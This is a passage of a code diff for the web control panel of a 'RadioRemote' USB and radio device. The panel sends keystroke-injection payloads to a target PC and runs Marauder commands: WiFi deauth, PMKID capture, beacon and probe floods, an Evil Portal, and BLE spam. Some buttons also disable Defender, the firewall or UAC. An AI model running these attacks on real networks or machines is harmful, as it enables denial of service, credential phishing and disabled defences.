+      <div class="card-title">&#x1F4F9; VNC &mdash; Bildschirm des Ziel-PCs</div>
+      <p style="font-size:12px;color:var(--muted);margin-bottom:12px">Agent muss installiert und verbunden sein (Status-Tab zeigt &quot;Agent: Connected&quot;).</p>
+      <a href="/vnc/index.html" target="_blank" class="btn btn-primary" style="display:inline-block;margin-bottom:10px">&#x25BA; VNC-Viewer &ouml;ffnen</a>
+      <p style="font-size:11px;color:var(--muted)">Der VNC-Viewer &ouml;ffnet sich in einem neuen Tab und verbindet sich automatisch via WebSocket.</p>
+    </div>
+  </div>
+
+  <!-- DIAGNOSE -->
+  <div class="tab-panel" id="tab-diagnose">
+    <div id="dia-hid-warn" class="hid-warning">&#x26A0; Diagnostic tools require USB HID mode.</div>
+    <div style="background:rgba(0,255,65,.05);border:1px solid var(--border);border-radius:8px;padding:14px;margin-bottom:16px;font-size:11px;color:var(--muted)">
+      &#x1F4A1; <strong style="color:var(--teal)">Tip:</strong> Reports marked &quot;-&gt; SD&quot; are saved to the SD root and downloadable in the Files tab.
+    </div>
+    <div class="grid-2">
+      <div class="card">
+        <div class="card-title">&#x1F4BB; System Info</div>
+        <div style="display:flex;flex-direction:column;gap:8px">
+          <button class="btn btn-sm btn-primary" onclick="pcTool('sys_report_sd')">&#x1F4BE; System Report -> SD (msinfo32)</button>
+          <button class="btn btn-sm" onclick="pcTool('sysinfo')">&#x1F4BB; Open msinfo32</button>
+          <button class="btn btn-sm" onclick="pcTool('dxdiag_sd')">&#x1F3AE; DirectX Diag -> SD</button>
+          <button class="btn btn-sm" onclick="pcTool('winver')">&#x1F4C4; Windows Version</button>
+          <button class="btn btn-sm" onclick="pcTool('hwinfo_clip')">&#x1F4CB; Hardware Info -> Clipboard</button>
+          <button class="btn btn-sm" onclick="pcTool('activation_check')">&#x1F511; Check Windows Activation</button>
+        </div>
+      </div>
+      <div class="card">
+        <div class="card-title">&#x1F50B; Battery &amp; Power</div>
+        <div style="display:flex;flex-direction:column;gap:8px">
+          <button class="btn btn-sm btn-primary" onclick="pcTool('battery_report')">&#x1F50B; Battery Report -> SD (powercfg)</button>
+          <button class="btn btn-sm" onclick="pcTool('battery_clip')">&#x1F4CB; Battery Status -> Clipboard</button>
+          <button class="btn btn-sm" onclick="pcTool('sleep_report')">&#x1F4CA; Energy Efficiency Report -> SD</button>
+          <button class="btn btn-sm" onclick="pcTool('power_plan')">&#x26A1; Open Power Options</button>
+          <button class="btn btn-sm" onclick="pcTool('power_high')">&#x1F680; Set High Performance Plan</button>
+        </div>
+      </div>
+      <div class="card">
+        <div class="card-title">&#x1F4BE; Disk &amp; SMART</div>
+        <div style="display:flex;flex-direction:column;gap:8px">
+          <button class="btn btn-sm btn-primary" onclick="pcTool('smart_sd')">&#x1F4BE; SMART Status -> SD</button>
+          <button class="btn btn-sm" onclick="pcTool('smart_clip')">&#x1F4CB; SMART Status -> Clipboard</button>
+          <button class="btn btn-sm" onclick="pcTool('disk_space')">&#x1F4CA; Disk Usage -> Clipboard</button>
+          <button class="btn btn-sm" onclick="pcTool('chkdsk')">&#x1F527; Schedule chkdsk C:</button>
+          <button class="btn btn-sm" onclick="pcTool('crystaldisk_sd')">&#x1F4BF; CrystalDiskInfo from SD</button>
+        </div>
+      </div>
+      <div class="card">
+        <div class="card-title">&#x1F9E0; RAM &amp; CPU</div>
+        <div style="display:flex;flex-direction:column;gap:8px">
+          <button class="btn btn-sm btn-primary" onclick="pcTool('mem_diag')">&#x1F9E0; Schedule Memory Diagnostic</button>
+          <button class="btn btn-sm" onclick="pcTool('ram_info')">&#x1F4CB; RAM Info -> Clipboard</button>
+          <button class="btn btn-sm" onclick="pcTool('cpu_info')">&#x1F4CB; CPU Info -> Clipboard</button>
+          <button class="btn btn-sm" onclick="pcTool('temp_info')">&#x1F321; Temperatures -> Clipboard</button>
+          <button class="btn btn-sm" onclick="pcTool('process_top')">&#x1F4CA; Top Processes -> Clipboard</button>
+          <button class="btn btn-sm" onclick="pcTool('hwinfo_sd')">&#x1F321; HWiNFO64 from SD</button>
+        </div>
+      </div>
+      <div class="card">
+        <div class="card-title">&#x1F579; Drivers &amp; Devices</div>
+        <div style="display:flex;flex-direction:column;gap:8px">
+          <button class="btn btn-sm btn-primary" onclick="pcTool('driver_sd')">&#x1F4BE; Driver List -> SD (driverquery)</button>
+          <button class="btn btn-sm" onclick="pcTool('driver_unsigned')">&#x26A0; Check Unsigned Drivers</button>
+          <button class="btn btn-sm" onclick="pcTool('problem_devices')">&#x2757; Problem Devices -> Clipboard</button>
+          <button class="btn btn-sm" onclick="pcTool('usb_devices')">&#x1F50C; USB Devices -> Clipboard</button>
+          <button class="btn btn-sm" onclick="pcTool('devmgr')">&#x2699; Open Device Manager</button>
+        </div>
+      </div>
+      <div class="card">
+        <div class="card-title">&#x1F4CB; Crashes &amp; Logs</div>
+        <div style="display:flex;flex-direction:column;gap:8px">
+          <button class="btn btn-sm btn-primary" onclick="pcTool('crash_report')">&#x1F4BE; Crash Log -> SD</button>
+          <button class="btn btn-sm" onclick="pcTool('bsod_check')">&#x1F4CB; BSOD History -> Clipboard</button>
+          <button class="btn btn-sm" onclick="pcTool('minidump_sd')">&#x1F4BE; Copy Minidumps -> SD</button>
+          <button class="btn btn-sm" onclick="pcTool('reliability')">&#x1F4CA; Reliability Monitor</button>
+          <button class="btn btn-sm" onclick="pcTool('eventvwr')">&#x1F4CB; Event Viewer</button>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- MEDICAT -->
+  <div class="tab-panel" id="tab-medicat">
+    <div style="background:rgba(255,170,0,.08);border:1px solid rgba(255,170,0,.35);border-radius:8px;padding:16px;margin-bottom:18px">
+      <div style="font-size:13px;color:var(--warn);font-weight:700;margin-bottom:8px">&#x1F4BF; MediCat USB Toolkit Integration</div>
+      <p style="font-size:11px;color:var(--muted);line-height:1.7">
+        Install MediCat on SD card. USB Storage mode exposes SD as bootable drive.<br>
+        Place portable tools in <code style="color:var(--teal)">/PortableApps/</code> on SD:<br>
+        <span style="color:var(--green)">AnyDesk.exe &bull; TeamViewerQS.exe &bull; RustDesk.exe &bull; HWiNFO64.exe &bull; CrystalDiskInfo.exe &bull; Recuva.exe &bull; MBSetup.exe &bull; procexp64.exe &bull; Autoruns64.exe</span>
+      </p>
+    </div>
+    <div class="grid-2">
+      <div class="card">
+        <div class="card-title">&#x1F4BF; Boot &amp; WinRE</div>
+        <div style="display:flex;flex-direction:column;gap:8px">
+          <button class="btn btn-sm btn-primary" onclick="mediCatBoot()">&#x1F4BE; Enable USB Storage (Boot MediCat)</button>
+          <button class="btn btn-sm" onclick="pcTool('bios_boot_menu')">&#x2328; Spam F12 (Boot Menu via HID)</button>
+          <button class="btn btn-sm" onclick="pcTool('winpe_reboot')">&#x1F504; Reboot to WinRE / Advanced Options</button>
+          <button class="btn btn-sm btn-warn" onclick="pcTool('uefi_reboot')">&#x2699; Reboot to UEFI/BIOS</button>
+          <button class="btn btn-sm btn-warn" onclick="setUsb('hid')">&#x2328; Back to HID Mode</button>
+        </div>
+      </div>
+      <div class="card">
+        <div class="card-title">&#x1F4C2; Launch Portable Tools</div>
+        <p style="font-size:10px;color:var(--muted);margin-bottom:8px">SD must be visible as USB drive. Files in /PortableApps/</p>
+        <div style="display:flex;flex-direction:column;gap:8px">
+          <button class="btn btn-sm" onclick="pcTool('anydesk_sd')">&#x1F5A5; AnyDesk.exe</button>
+          <button class="btn btn-sm" onclick="pcTool('teamviewer_sd')">&#x1F4F1; TeamViewerQS.exe</button>
+          <button class="btn btn-sm" onclick="pcTool('rustdesk_sd')">&#x1F680; RustDesk.exe</button>
+          <button class="btn btn-sm" onclick="pcTool('hwinfo_sd')">&#x1F321; HWiNFO64.exe</button>
+          <button class="btn btn-sm" onclick="pcTool('crystaldisk_sd')">&#x1F4BF; CrystalDiskInfo.exe</button>
+          <button class="btn btn-sm" onclick="pcTool('recuva_sd')">&#x267B; Recuva.exe</button>
+          <button class="btn btn-sm" onclick="pcTool('malwarebytes_sd')">&#x1F6E1; MBSetup.exe (Malwarebytes)</button>
+          <button class="btn btn-sm" onclick="pcTool('procexp_sd')">&#x1F50D; Process Explorer</button>
+          <button class="btn btn-sm" onclick="pcTool('autoruns_sd')">&#x1F504; Autoruns64.exe</button>
+        </div>
+      </div>
+      <div class="card">
+        <div class="card-title">&#x267B; Data Recovery</div>
+        <div style="display:flex;flex-direction:column;gap:8px">
+          <button class="btn btn-sm btn-primary" onclick="pcTool('shadow_list')">&#x1F4CB; List Shadow Copies -> Clipboard</button>
+          <button class="btn btn-sm" onclick="pcTool('shadow_create')">&#x2795; Create Shadow Copy</button>
+          <button class="btn btn-sm" onclick="pcTool('recuva_sd')">&#x1F4BE; Recuva (File Recovery)</button>
+          <button class="btn btn-sm" onclick="pcTool('prev_versions')">&#x23EA; Previous Versions</button>
+          <button class="btn btn-sm" onclick="pcTool('recycle_show')">&#x267B; Open Recycle Bin</button>
+        </div>
+      </div>
+      <div class="card">
+        <div class="card-title">&#x1F4C1; SD Card &amp; Backup</div>
+        <div style="display:flex;flex-direction:column;gap:8px">
+          <button class="btn btn-sm btn-primary" onclick="mediCatBoot()">&#x1F4BE; Mount SD as USB Drive</button>
+          <button class="btn btn-sm" onclick="pcTool('sd_open_explorer')">&#x1F4C2; Open SD in Explorer</button>
+          <button class="btn btn-sm" onclick="pcTool('sd_backup_docs')">&#x1F4BE; Backup Documents -> SD</button>
+          <button class="btn btn-sm" onclick="pcTool('sd_backup_desktop')">&#x1F4BE; Backup Desktop -> SD</button>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- REPAIR -->
+  <div class="tab-panel" id="tab-reparatur">
+    <div id="rep-hid-warn" class="hid-warning">&#x26A0; Repair tools require USB HID mode.</div>
+    <div class="grid-2">
+      <div class="card">
+        <div class="card-title">&#x1F527; System Repair</div>
+        <div style="display:flex;flex-direction:column;gap:8px">
+          <button class="btn btn-sm btn-primary" onclick="pcTool('sfc')">&#x1F527; SFC /scannow</button>
+          <button class="btn btn-sm btn-primary" onclick="pcTool('dism')">&#x1F527; DISM RestoreHealth</button>
+          <button class="btn btn-sm" onclick="pcTool('sfc_dism_combo')">&#x1F504; SFC + DISM combined -> SD</button>
+          <button class="btn btn-sm" onclick="pcTool('repair_apps')">&#x1F4E6; Re-register Store Apps</button>
+          <button class="btn btn-sm" onclick="pcTool('winsock_reset')">&#x1F310; Reset Winsock + TCP/IP</button>
+          <button class="btn btn-sm btn-warn" onclick="pcTool('windows_reset_keep')">&#x1F504; Reset Windows (keep files)</button>
+        </div>
+      </div>
+      <div class="card">
+        <div class="card-title">&#x1F462; Boot Repair</div>
+        <div style="display:flex;flex-direction:column;gap:8px">
+          <button class="btn btn-sm btn-warn" onclick="pcTool('fix_mbr')">&#x1F527; Fix MBR (bootrec /fixmbr)</button>
+          <button class="btn btn-sm btn-warn" onclick="pcTool('fix_boot')">&#x1F527; Fix Boot Sector (/fixboot)</button>
+          <button class="btn btn-sm btn-warn" onclick="pcTool('fix_bcd')">&#x1F527; Rebuild BCD (/rebuildbcd)</button>
+          <button class="btn btn-sm" onclick="pcTool('bcdedit_safe')">&#x1F4BB; Boot to Safe Mode (minimal)</button>
+          <button class="btn btn-sm" onclick="pcTool('bcdedit_safe_net')">&#x1F4BB; Safe Mode with Networking</button>
+          <button class="btn btn-sm btn-primary" onclick="pcTool('bcdedit_normal')">&#x2705; Restore Normal Boot</button>
+        </div>
+      </div>
+      <div class="card">
+        <div class="card-title">&#x1F9F9; Cleanup</div>
+        <div style="display:flex;flex-direction:column;gap:8px">
+          <button class="btn btn-sm btn-primary" onclick="pcTool('clear_temp')">&#x1F9F9; Delete Temp Files</button>
+          <button class="btn btn-sm" onclick="pcTool('disk_cleanup')">&#x1F5D1; Disk Cleanup</button>
+          <button class="btn btn-sm" onclick="pcTool('prefetch_clear')">&#x1F9F9; Clear Prefetch Cache</button>
+          <button class="btn btn-sm" onclick="pcTool('dns_cache_clear')">&#x1F9F9; Flush DNS Cache</button>
+          <button class="btn btn-sm" onclick="pcTool('icon_cache_clear')">&#x1F9F9; Rebuild Icon Cache</button>
+          <button class="btn btn-sm" onclick="pcTool('update_cache_clear')">&#x1F9F9; Clear Windows Update Cache</button>
+        </div>
+      </div>
+      <div class="card">
+        <div class="card-title">&#x1F504; Recovery &amp; Performance</div>
+        <div style="display:flex;flex-direction:column;gap:8px">
+          <button class="btn btn-sm btn-primary" onclick="pcTool('restore_point')">&#x2795; Create Restore Point</button>
+          <button class="btn btn-sm" onclick="pcTool('restore_open')">&#x23EA; Open System Restore</button>
+          <button class="btn btn-sm" onclick="pcTool('power_high')">&#x26A1; High Performance Power Plan</button>
+          <button class="btn btn-sm" onclick="pcTool('visual_effects_off')">&#x1F4BA; Reduce Visual Effects</button>
+          <button class="btn btn-sm" onclick="pcTool('trim_ssd')">&#x1F4BE; Run SSD TRIM</button>
+          <button class="btn btn-sm" onclick="pcTool('page_file_reset')">&#x1F9E0; Reset Page File (auto)</button>
+        </div>
+      </div>
+      <div class="card">
+        <div class="card-title">&#x1F4E6; Updates &amp; Drivers</div>
+        <div style="display:flex;flex-direction:column;gap:8px">
+          <button class="btn btn-sm btn-primary" onclick="pcTool('update_drivers')">&#x2B06; Open Windows Update</button>
+          <button class="btn btn-sm" onclick="pcTool('force_update')">&#x1F504; Force Update Check</button>
+          <button class="btn btn-sm" onclick="pcTool('update_cache_clear')">&#x1F9F9; Clear Update Cache</button>
+          <button class="btn btn-sm btn-warn" onclick="pcTool('update_disable')">&#x23F8; Disable Automatic Updates</button>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- SECURITY -->
+  <div class="tab-panel" id="tab-sicherheit">
+    <div id="sic-hid-warn" class="hid-warning">&#x26A0; Security tools require USB HID mode.</div>
+    <div class="grid-2">
+      <div class="card">
+        <div class="card-title">&#x1F6E1; Windows Defender</div>
+        <div style="display:flex;flex-direction:column;gap:8px">
+          <button class="btn btn-sm btn-primary" onclick="pcTool('defender_scan_quick')">&#x1F50D; Quick Scan</button>
+          <button class="btn btn-sm" onclick="pcTool('defender_scan_full')">&#x1F50D; Full Scan</button>
+          <button class="btn btn-sm" onclick="pcTool('defender_update')">&#x2B06; Update Signatures</button>
+          <button class="btn btn-sm" onclick="pcTool('enable_defender')">&#x2705; Enable Realtime Protection</button>
+          <button class="btn btn-sm btn-warn" onclick="pcTool('disable_defender')">&#x26A0; Disable Realtime Protection</button>
+          <button class="btn btn-sm" onclick="pcTool('defender_history')">&#x1F4CB; Detection History -> Clipboard</button>
+        </div>
+      </div>
+      <div class="card">
+        <div class="card-title">&#x1F525; Firewall</div>
+        <div style="display:flex;flex-direction:column;gap:8px">
+          <button class="btn btn-sm btn-primary" onclick="pcTool('enable_firewall')">&#x2705; Enable Firewall</button>
+          <button class="btn btn-sm btn-warn" onclick="pcTool('disable_firewall')">&#x26A0; Disable Firewall</button>
+          <button class="btn btn-sm" onclick="pcTool('firewall_rules_sd')">&#x1F4BE; Export Firewall Rules -> SD</button>
+          <button class="btn btn-sm" onclick="pcTool('open_ports')">&#x1F4CB; Open Ports -> Clipboard</button>
+          <button class="btn btn-sm btn-danger" onclick="pcTool('block_internet')">&#x1F6AB; Block All Internet (Emergency)</button>
+        </div>
+      </div>
+      <div class="card">
+        <div class="card-title">&#x1F50D; Analysis &amp; Forensics</div>
+        <div style="display:flex;flex-direction:column;gap:8px">
+          <button class="btn btn-sm btn-primary" onclick="pcTool('process_report')">&#x1F4BE; Process List -> SD (with paths)</button>
+          <button class="btn btn-sm" onclick="pcTool('connection_report')">&#x1F4BE; Network Connections -> SD</button>
+          <button class="btn btn-sm" onclick="pcTool('startup_report')">&#x1F4BE; Startup Entries -> SD</button>
+          <button class="btn btn-sm" onclick="pcTool('task_report')">&#x1F4BE; Scheduled Tasks -> SD</button>
+          <button class="btn btn-sm" onclick="pcTool('hosts_check')">&#x1F50D; Hosts File -> Clipboard</button>
+          <button class="btn btn-sm" onclick="pcTool('procexp_sd')">&#x1F50D; Process Explorer from SD</button>
+          <button class="btn btn-sm" onclick="pcTool('autoruns_sd')">&#x1F504; Autoruns from SD</button>
+        </div>
+      </div>
+      <div class="card">
+        <div class="card-title">&#x1F9F9; Malware Response</div>
+        <div style="display:flex;flex-direction:column;gap:8px">
+          <button class="btn btn-sm btn-danger" onclick="pcTool('kill_ransomware')">&#x1F6D1; Kill Ransomware Processes</button>
+          <button class="btn btn-sm btn-warn" onclick="pcTool('block_internet')">&#x1F6AB; Block Internet (Firewall)</button>
+          <button class="btn btn-sm" onclick="pcTool('malwarebytes_sd')">&#x1F6E1; Malwarebytes from SD</button>
+          <button class="btn btn-sm" onclick="pcTool('safe_mode_boot')">&#x1F4BB; Boot to Safe Mode</button>
+          <button class="btn btn-sm" onclick="pcTool('restore_open')">&#x23EA; System Restore</button>
+          <button class="btn btn-sm" onclick="pcTool('defender_scan_full')">&#x1F50D; Defender Full Scan</button>
+        </div>
+      </div>
+      <div class="card">
+        <div class="card-title">&#x1F512; Access Control</div>
+        <div style="display:flex;flex-direction:column;gap:8px">
+          <button class="btn btn-sm" onclick="pcTool('lock_pc')">&#x1F512; Lock PC</button>
+          <button class="btn btn-sm" onclick="pcTool('uac_enable')">&#x2705; Enable UAC</button>
+          <button class="btn btn-sm btn-warn" onclick="pcTool('uac_disable')">&#x26A0; Disable UAC</button>
+          <button class="btn btn-sm btn-warn" onclick="pcTool('disable_usb_storage')">&#x1F6AB; Block USB Storage (Registry)</button>
+          <button class="btn btn-sm" onclick="pcTool('enable_usb_storage')">&#x2705; Allow USB Storage</button>
+        </div>
+      </div>
+    </div>
+  </div>
+
+
+</div>
+<div id="toast-ct"></div>
+
+<script>
+var D={},PL=[],FL=[],caps=[],hasHID=false,curCat='all',curMCat='all';
+
+var CMDS=[
+  {c:'scanap',      d:'Scan for WiFi access points',          p:'',                   m:'WiFi'},
+  {c:'stopscan',    d:'Stop all active scans',                p:'',                   m:'WiFi'},
+  {c:'wardrive',    d:'Wardrive mode - log APs to SD',        p:'',                   m:'WiFi'},
+  {c:'list -a',     d:'List found access points',             p:'',                   m:'WiFi'},
+  {c:'list -c',     d:'List found clients',                   p:'',                   m:'WiFi'},
+  {c:'select -a 0', d:'Select AP by index',                   p:'-a <index>',         m:'WiFi'},
+  {c:'select -c 0', d:'Select client by index',               p:'-c <index>',         m:'WiFi'},
+  {c:'sniffpmkid',  d:'Sniff PMKID handshakes to SD',         p:'',                   m:'Sniff'},
+  {c:'sniffdeauth', d:'Sniff deauthentication frames',         p:'',                   m:'Sniff'},
+  {c:'sniffbeacon', d:'Sniff 802.11 beacon frames',            p:'',                   m:'Sniff'},
+  {c:'sniffraw',    d:'Sniff raw 802.11 frames',               p:'',                   m:'Sniff'},
+  {c:'deauth',      d:'Deauth targeted AP/client',            p:'',                   m:'Attack'},
+  {c:'deauthall',   d:'Deauth all scanned access points',     p:'',                   m:'Attack'},
+  {c:'beacon',      d:'Beacon spam with SSIDs',               p:'[-n <name>] [-r]',   m:'Attack'},
+  {c:'probe',       d:'Probe flood with random SSIDs',        p:'',                   m:'Attack'},
+  {c:'evilportal',  d:'Start Evil Portal captive portal',     p:'[-h <htmlfile>]',    m:'Attack'},
+  {c:'clearap',     d:'Clear the AP scan list',               p:'',                   m:'Attack'},
+  {c:'btspamall',   d:'BLE spam - all device types',          p:'',                   m:'BLE'},
+  {c:'sourapple',   d:'Apple BLE notification spam',          p:'',                   m:'BLE'},
+  {c:'swiftpair',   d:'Windows Swift Pair BLE spam',          p:'',                   m:'BLE'},
+  {c:'skimmer',     d:'Bluetooth skimmer simulation',         p:'',                   m:'BLE'},
+  {c:'scanbt',      d:'Scan Bluetooth/BLE devices',           p:'',                   m:'BLE'},
+  {c:'info',        d:'Show device information',              p:'',                   m:'Info'},
+  {c:'help',        d:'List all available commands',          p:'',                   m:'Info'},
+  {c:'mem',         d:'Show memory usage',                    p:'',                   m:'Info'},
+  {c:'reboot',      d:'Reboot the device',                    p:'',                   m:'Info'},
+];
+
+function showTab(name,el){
+  document.querySelectorAll('.tab-panel').forEach(function(p){p.classList.remove('active')});
+  document.querySelectorAll('.nav-tab').forEach(function(t){t.classList.remove('active')});
+  document.getElementById('tab-'+name).classList.add('active');
+  el.classList.add('active');
+  if(name==='payloads'&&PL.length===0)loadPL();
+  if(name==='marauder')renderMrdr();
+  if(name==='logs'){var l=document.getElementById('log-out');l.scrollTop=l.scrollHeight;}
+  if(name==='pcsupport'){var w=document.getElementById('pcsup-hid-warn');if(w)w.style.display=hasHID?'none':'flex';}
+  var hidTabs={'fernwartung':'fw-hid-warn','diagnose':'dia-hid-warn','reparatur':'rep-hid-warn','sicherheit':'sic-hid-warn'};
+  if(hidTabs[name]){var hw=document.getElementById(hidTabs[name]);if(hw)hw.style.display=hasHID?'none':'flex';}
+}
+
+function esc(s){return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;')}
+
+async function fetchD(){
+  try{
+    var r=await fetch('/data.json');
+    if(!r.ok)throw 0;
+    D=await r.json();
+    updateUI();
+    document.getElementById('s-dot').className='status-dot';
+  }catch(e){document.getElementById('s-dot').className='status-dot offline';}
+}
+
+function updateUI(){
+  var ver=(D.version||'---').substring(0,8);
+  document.getElementById('v-badge').textContent='v'+ver;
+  document.getElementById('ab-ver').textContent=ver;
+  document.getElementById('s-heap').textContent=Math.round((D.freeHeap||0)/1024)+'K';
+  document.getElementById('s-sd').textContent=(D.sdCardPercentFull||0)+'%';
+  document.getElementById('s-up').textContent=fmtUp(D.uptime||'');
+  document.getElementById('s-err').textContent=D.errorCount||0;
+  var hp=D.heapUsagePc||0;
+  var hb=document.getElementById('heap-bar');
+  hb.style.width=hp+'%';hb.className='progress-bar'+(hp>80?' danger':hp>60?' warn':'');
+  var sp=D.sdCardPercentFull||0;
+  var sb=document.getElementById('sd-bar');
+  sb.style.width=sp+'%';sb.className='progress-bar'+(sp>85?' danger':sp>60?' warn':'');
+  document.getElementById('i-chip').textContent=D.chipModel||'--';
+  document.getElementById('i-cores').textContent=(D.numCores||'--')+' cores';
+  document.getElementById('i-usb').textContent=D.USBmode||'--';
+  var ag=document.getElementById('i-agent');
+  ag.textContent=D.agentConnected?'&#x25CF; Connected':'&#x25CB; Disconnected';
+  ag.style.color=D.agentConnected?'var(--green)':'var(--danger)';
+  document.getElementById('i-machine').textContent=D.machineName||'--';
+  caps=D.capabilities||[];
+  hasHID=caps.indexOf('USB_HID')>=0;
+  document.getElementById('cap-list').innerHTML=caps.map(function(c){return'<span class="badge badge-'+c+'">'+esc(c)+'</span>'}).join('');
+  var hw=document.getElementById('hid-warn');if(hw)hw.style.display=hasHID?'none':'flex';
+  var run=!!D.status;
+  ['run-ind','run-ind-p'].forEach(function(id){var e=document.getElementById(id);if(e)e.className='running-indicator'+(run?' visible':'')});
+  var re=document.getElementById('run-errs');if(re)re.textContent=(D.errorCount>0)?'('+D.errorCount+' errors)':'';
+  renderFiles(D.fileListing||[]);
+  renderSettings(D.settingCategories||[]);
+  renderLogs(D.logMessages||[]);
+}
+
+function fmtUp(u){if(!u)return'--';var m=u.match(/(\d+)/);return m?m[1]:u.substring(0,6);}
+
+async function loadPL(){
+  try{var r=await fetch('/payloadinfo');PL=await r.json();renderPL();}
+  catch(e){document.getElementById('pl-grid').innerHTML='<div class="empty">Failed to load payloads</div>';}
+}
+
+function renderPL(){
+  var q=(document.getElementById('pl-search').value||'').toLowerCase();
+  var f=PL.filter(function(p){
+    if(curCat!=='all'&&p.category!==curCat)return false;
+    if(q&&p.name.toLowerCase().indexOf(q)<0&&p.description.toLowerCase().indexOf(q)<0)return false;
+    return true;
+  });
+  var g=document.getElementById('pl-grid');
+  if(!f.length){g.innerHTML='<div class="empty">No payloads found</div>';return;}
+  g.innerHTML=f.map(function(p){
+    var dis=p.hid_required&&!hasHID;
+    var cc='badge-'+(p.category||'misc');
+    return'<div class="payload-card'+(dis?' hid-disabled':'')+'">'+
+      '<div class="payload-name">'+esc(p.name)+'</div>'+
+      '<div class="payload-desc">'+esc(p.description)+'</div>'+
+      '<div class="payload-footer">'+
+        '<span class="badge '+cc+'">'+esc(p.category)+'</span>'+
+        (dis?'<span class="btn btn-xs btn-warn" title="Requires USB HID">&#x26A0; HID only</span>':
+          '<button class="btn btn-xs btn-primary" onclick="runPL(\''+esc(p.name).replace(/'/g,"\\'")+'\')">&#x25BA; Run</button>')+
+      '</div></div>';
+  }).join('');
+}
+
+function filterPL(){renderPL();}
+function setC(c,el){curCat=c;document.querySelectorAll('[data-c]').forEach(function(b){b.classList.remove('active')});el.classList.add('active');renderPL();}
+
+function runPL(n){
+  fetch('/runfile?filename='+encodeURIComponent(n))
+    .then(function(){toast('&#x25BA; Running: '+n,'success')})
+    .catch(function(){toast('Failed to run payload','error')});
+}
+
+function renderMrdr(){
+  var f=CMDS.filter(function(c){return curMCat==='all'||c.m===curMCat;});
+  document.getElementById('mrdr-grid').innerHTML=f.map(function(c){
+    return'<div class="cmd-card">'+
+      '<div class="cmd-name">'+esc(c.c)+'</div>'+
+      '<div class="cmd-desc">'+esc(c.d)+'</div>'+
+      (c.p?'<div class="cmd-params">'+esc(c.p)+'</div>':'')+
+      '<div class="cmd-footer"><span class="cat-badge cat-'+c.m+'">'+c.m+'</span>'+
+      '<button class="btn btn-xs btn-primary" onclick="runMrdr(\''+esc(c.c).replace(/'/g,"\\'")+'\')">&#x25BA; Execute</button>'+
+      '</div></div>';
+  }).join('');
+}
+
+function setMC(m,el){curMCat=m;document.querySelectorAll('[data-m]').forEach(function(b){b.classList.remove('active')});el.classList.add('active');renderMrdr();}
+
+function runMrdr(cmd){
+  cmd=cmd?cmd.trim():'';
+  if(!cmd)return;
+  fetch('/marauder?marauderCmd='+encodeURIComponent(cmd))
+    .then(function(){toast('&#x1F4E1; '+cmd,'success')})
+    .catch(function(){toast('Marauder failed','error')});
+}
+
+function renderFiles(files){FL=files;filterF();}
+function filterF(){
+  var q=(document.getElementById('f-search').value||'').toLowerCase();
+  var f=FL.filter(function(n){return!q||n.toLowerCase().indexOf(q)>=0;});
+  var l=document.getElementById('f-list');
+  if(!f.length){l.innerHTML='<div class="empty">No files</div>';return;}
+  l.innerHTML=f.map(function(n){
+    var ext=n.split('.').pop();
+    var isDs=ext==='ds';
+    return'<div class="file-row">'+
+      '<div class="file-name">'+esc(n)+'</div>'+
+      '<div class="file-actions">'+
+        (isDs?'<button class="btn btn-xs btn-primary" onclick="runPL(\''+esc(n).replace(/'/g,"\\'")+'\')">&#x25BA;</button>':'')+
+        '<a class="btn btn-xs" href="/download?filename='+encodeURIComponent(n)+'" download>&#x2193;</a>'+
+        '<button class="btn btn-xs btn-danger" onclick="delFile(\''+esc(n).replace(/'/g,"\\'")+'\')">&#x2715;</button>'+
+      '</div></div>';
+  }).join('');
+}
+
+function delFile(n){
+  if(!confirm('Delete '+n+'?'))return;
+  fetch('/delete?filename='+encodeURIComponent(n))
+    .then(function(){toast('Deleted: '+n,'warn');fetchD();})
+    .catch(function(){toast('Delete failed','error');});
+}
+
+function renderSettings(cats){
+  var c=document.getElementById('sett-body');
+  if(!cats||!cats.length){c.innerHTML='<div class="empty">No settings</div>';return;}
+  c.innerHTML=cats.map(function(cat){
+    return'<div style="margin-bottom:18px"><div style="font-size:10px;color:var(--muted);letter-spacing:2px;text-transform:uppercase;margin-bottom:10px">'+esc(cat.name||'General')+'</div>'+
+      (cat.settings||[]).map(function(s){
+        var inp=s.type===1||s.type==='bool'
+          ?'<input class="setting-input" type="checkbox"'+(s.value?' checked':'')+'>'
+          :'<input class="setting-input" type="text" value="'+esc(String(s.value||''))+'">';
+        return'<div class="setting-row"><div class="setting-name">'+esc(s.name)+'</div>'+
+          '<div style="display:flex;gap:6px;align-items:center">'+inp+
+          '<button class="btn btn-xs btn-primary" onclick="saveSett(this)">Save</button></div></div>';
+      }).join('')+'</div>';
+  }).join('');
+}
+
+function saveSett(btn){
+  var row=btn.closest('.setting-row');
+  var nm=row.querySelector('.setting-name').textContent;
+  var inp=row.querySelector('.setting-input');
+  var val=inp.type==='checkbox'?(inp.checked?'true':'false'):inp.value;
+  fetch('/set?name='+encodeURIComponent(nm)+'&value='+encodeURIComponent(val))
+    .then(function(){toast('Saved: '+nm,'success')})
+    .catch(function(){toast('Save failed','error')});
+}
+
+function renderLogs(logs){
+  var el=document.getElementById('log-out');
+  var atBot=el.scrollHeight-el.scrollTop-el.clientHeight<40;
+  if(!logs||!logs.length){el.innerHTML='<div class="empty" style="padding:20px">No logs</div>';return;}
+  el.innerHTML=logs.map(function(l){return'<div class="log-entry">'+esc(l)+'</div>'}).join('');
+  if(atBot)el.scrollTop=el.scrollHeight;
+}
+
+function clrLogs(){fetch('/clearlogs').then(function(){toast('Logs cleared','warn');fetchD();});}
+function refresh(){fetchD();}
+
+function devReboot(){
+  if(!confirm('Reboot the RadioRemote device?'))return;
+  fetch('/reboot').then(function(){toast('&#x1F504; Rebooting...','warn');}).catch(function(){toast('Reboot sent','warn');});
+}
+
+function setUsb(mode){
+  var labels={storage:'USB Storage',hid:'USB HID',ncm:'USB NCM',serial:'USB Serial',none:'USB Off'};
+  if(!confirm('Switch to '+labels[mode]+'? Device will reboot.'))return;
+  fetch('/setusb'+mode).then(function(){toast('&#x1F504; Switching to '+labels[mode]+'...','warn');}).catch(function(){toast('USB mode change sent','warn');});
+}
+
+var PC_TOOLS={
+  sysinfo:      'WINDOWS r\nDELAY 500\nSTRING msinfo32\nENTER',
+  taskmgr:      'CTRL-SHIFT-ESCAPE',
+  devmgr:       'WINDOWS r\nDELAY 500\nSTRING devmgmt.msc\nENTER',
